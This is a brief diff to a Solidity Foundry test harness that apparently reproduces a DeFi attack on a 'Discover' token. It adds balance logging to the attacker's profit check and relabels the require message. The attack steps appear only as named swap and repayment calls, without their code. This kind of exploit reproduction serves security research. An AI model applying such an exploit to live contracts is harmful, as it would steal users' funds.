@@ -160,7 +160,9 @@ contract DiscoverTestBase is Test, BlockLoader {
         emit log_string("");
     }
 
-    function attackGoal() public view returns (bool) {
+    function attackGoal() public returns (bool) {
+        emit log_named_uint("StartBalance", balanceOfusdtattacker);
+        emit log_named_uint("FinalBalance", usdt.balanceOf(attacker));
         return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
     }
 
@@ -272,7 +274,7 @@ contract DiscoverTestBase is Test, BlockLoader {
         swap_pair_attacker_disc_usdt(amt1, amt2);
         swap_ethpledge_attacker_usdt_disc(amt3, amt4);
         payback_disc_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
